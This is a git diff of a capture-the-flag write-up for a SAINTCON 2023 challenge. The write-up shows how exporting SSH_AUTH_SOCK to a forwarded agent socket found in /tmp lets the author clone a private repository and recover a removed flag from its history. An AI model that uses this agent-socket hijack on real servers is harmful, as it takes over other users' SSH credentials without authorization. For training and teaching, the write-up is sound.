@@ -30,20 +30,20 @@ drwxrwxr-x. 8 hc hc 4.0K Nov  1 02:47 .git
 ```
 
 Not much in the README:
-```bash
+```
 ➜  cat README.md
 # SuperCoolSecretProject
 ```
 
 A quick grep reveals a .flag file is being ignored via the gitignore.
-```bash
+```
 ➜  HC2023-SuperCoolSecretProject git:(main) grep -R 'flag' .
 ./.gitignore:.flag
 ```
 
 Hm, well let's take a look at the git log and see what history exists in version control. It's possible the file was committed to the repo at one point and then was later removed. If that's the case there's a chance it wasn't removed properly from the repo and we may be able to recover it.
 
-```bash
+```
 ➜  git log
 78aba76 - (grafted, HEAD, origin/main, origin/HEAD, main) oops! remove secret (Sat Oct 21 21:11:41 2023 -0600) <zevlag>
 ```
@@ -78,16 +78,16 @@ origin	git@github.com:SAINTCON-HC2023/SuperCoolSecretProject.git (fetch)
 origin	git@github.com:SAINTCON-HC2023/SuperCoolSecretProject.git (push)
 ```
 
-Great, that's something. It's host on github and has an ssh origin url. That means the repository can be pulled and pushed to over ssh with public key authentication. We know the deployserver used ssh to securely copy the repository onto our server. Let's re-evaluate the commands that were used to do that:
+Great, that's something. It's hosted on github and has an ssh origin url. That means the repository can be pulled and pushed to over ssh with public key authentication. We know the deployserver used ssh to securely copy the repository onto our server. Let's re-evaluate the commands that were used to do that:
 
-```bash
+```
 git clone --depth 1 {censored URL}
 scp -P {port} -rCA ~/SuperCoolSecretProject {user}@{host}:~/HC2023-SuperCoolSecretProject
 ```
 
-Interesting.. The repository was cloned down with the same user that then securely copied the repository onto our server. In order to clone the repository, the user must have authenticated over ssh since the remote origin urls are ssh urls. Let's take a look at the options that were passed to the `scp` command (`-rCA`) to fully understand what it's doing. The `r` option means copy recursively and the `C` option enables compression which reduces the total bandwidth needed for the transfer. The `A` option doesn't appear to be a valid / documented scp option. However, if you use ssh often, you may know that `-A` is a valid option for `ssh`: If we RTFM:
+Interesting.. The repository was cloned down with the same user that then securely copied the repository onto our server. In order to clone the repository, the user must have authenticated over ssh since the remote origin urls are ssh urls. Let's take a look at the options that were passed to the `scp` command (`-rCA`) to fully understand what it's doing. The `r` option means copy recursively and the `C` option enables compression which reduces the total bandwidth needed for the transfer. The `A` option doesn't appear to be a valid / documented scp option. However, if you use ssh often, you may know that `-A` is a valid option for `ssh`:
 
-```bash
+```
 -A      Enables forwarding of connections from an authentication agent such as ssh-agent(1).  This can also be specified on a per-host basis in a configuration file.
 
         Agent forwarding should be enabled with caution.  Users with the ability to bypass file permissions on the remote host (for the agent's UNIX-domain socket) can access the local agent through the forwarded connection.  An attacker cannot obtain key
@@ -96,21 +96,62 @@ Interesting.. The repository was cloned down with the same user that then secure
 
 If someone is able to access the forwarded SSH_AUTH_SOCK, they could export it and use it as their own. We may be able to do exactly that. Just from experience, we know SSH_AUTH_SOCK is exported to /tmp by default with the pattern 'ssh-XXXXXXXXXX/agent.%d'. Let's take a look in /tmp on the server and see if the deployserver forwarded it's SSH_AUTH_SOCK:
 
-```bash
+```
 ➜  ls -lah /tmp/ssh-ARAGypNoQ0/agent.1303
 srwxr-xr-x. 1 hc hc 0 Nov  2 03:12 /tmp/ssh-ARAGypNoQ0/agent.1303
 ```
 
 Yep! It is. From here.. All we need to do is export SSH_AUTH_SOCK to that path in our environment.
 
-```bash
+```
 ➜  export SSH_AUTH_SOCK=/tmp/ssh-ARAGypNoQ0/agent.1303
 ```
 
-Now let's see if we can use this forwarded auth socket to authenticate with the remote repository and pull down any extra history that might exists:
+Now let's see if we can use it to authenticate with the remote repository by cloning the repo:
 
-```bash
-➜  git pull
+```
+➜  git clone git@github.com:SAINTCON-HC2023/SuperCoolSecretProject.git SuperCoolSecretProject
+Cloning into 'SuperCoolSecretProject'...
+remote: Enumerating objects: 12, done.
+remote: Counting objects: 100% (12/12), done.
+remote: Compressing objects: 100% (7/7), done.
+remote: Total 12 (delta 1), reused 11 (delta 0), pack-reused 0
+Receiving objects: 100% (12/12), done.
+Resolving deltas: 100% (1/1), done.
 ```
 
-TODO
+Perfect, we were able to. Let's check git history and see if we have more commits than the copy that was uploaded by deployserver
+
+```
+➜  git log
+e2e18b0 - (HEAD, origin/main, origin/HEAD, main) Whoops (Wed Oct 25 15:42:15 2023 +0000) <zevlag>
+78aba76 - oops! remove secret (Sat Oct 21 21:11:41 2023 -0600) <zevlag>
+fb3e3f5 - add .gitignore (Sat Oct 21 10:32:38 2023 -0600) <zevlag>
+d01e7c3 - first commit (Sat Oct 21 10:01:31 2023 -0600) <zevlag>
+```
+
+And.. we do! Great, let's inspect each of the commits not in the copied version, and see if we can find the flag.
+```diff
+➜  git show fb3e3f5
+fb3e3f5 - add .gitignore (Sat Oct 21 10:32:38 2023 -0600) <zevlag>
+
+diff --git a/.flag b/.flag
+new file mode 100644
+index 0000000..a86fbaf
+--- /dev/null
++++ b/.flag
+@@ -0,0 +1 @@
++flag{YouShouldCheckItOut-whoami.filippo.io}
+diff --git a/.gitignore b/.gitignore
+new file mode 100644
+index 0000000..5b11eb4
+--- /dev/null
++++ b/.gitignore
+@@ -0,0 +1,3 @@
++.flag
++id_rsa
++id_rsa.pub
+```
+
+And there we have it! It wasn't removed from the remote repository like it should have been, so we were able to recover it. Lesson here is to make sure you remove secrets not only from a local repo, but also from the remote.
+
